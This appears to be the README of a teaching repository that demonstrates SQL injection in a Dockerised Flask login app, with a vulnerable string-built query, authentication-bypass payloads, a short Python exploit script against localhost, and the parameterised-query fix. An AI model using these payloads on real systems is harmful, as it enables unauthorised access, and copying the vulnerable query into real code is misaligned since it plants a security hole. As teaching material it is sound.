# SQL Injection Vulnerability Demo

Simple containerized flask web application demonstrating an SQL injection vulnerability.


## How to Deploy
1. Install [Docker](https://www.docker.com/get-started/) and [Docker Compose](https://docs.docker.com/compose/install/).

2. Copy the `.env.example` file in [src/.env.example](src/.env.example), rename into `.env`, and set its own credentials.

```bash
cd src/
cp .env.example .env
```

3. Set DB Query at [src/query.sql.example](src/query.sql.example)

```bash
cd src/
cp query.sql.example query.sql
```

4. Run & build
```bash
docker compose up -d --build
```

or simply execute

```bash
chmod +x setup.sh \
    ./setup.sh
```

5. Access the app at running on nginx port `:8051`, http://localhost:8051 or http://127.0.0.1:8051


## Code Analysis

Comparing [this](https://github.com/nopedawn/sqli-vuln-demo/commit/2af893907355d83e37cc29410d8955310e78beb1) previous commit, are vulnerable to the sql injection

### Exploit

```python
# vulnerable to SQL injection
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

So the payload are look like this,

`' OR 1=1 -- ` or `' OR '1'='1' -- `

Exploit script

```python
import requests

url = "http://127.0.0.1:8051/login"

payload = "' OR '1'='1' -- "
data = {
    "username": payload,
    "password": "anything"
}
response = requests.post(url, data=data)

print("Status Code:", response.status_code)
print("Response Text:", response.text)
```

### How It Works

When this payload is injected into the username field and any value (or even empty) is provided for password, the query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''
```

- `' OR '1'='1'`: Always evaluates to `TRUE`, meaning the `SELECT` statement will return the first user from the database.
- `--`: Comments out the remaining part of the query (`AND password = ''`), making the password check irrelevant.

### Mitigate

To avoid from SQL Injection attack, use parameterized queries

```python
# mitigate: parameterized queries
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

## Reference

[Common SQLI Payload - payloadbox](https://github.com/payloadbox/sql-injection-payload-list) <br>
[SQL Injection Prevention - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)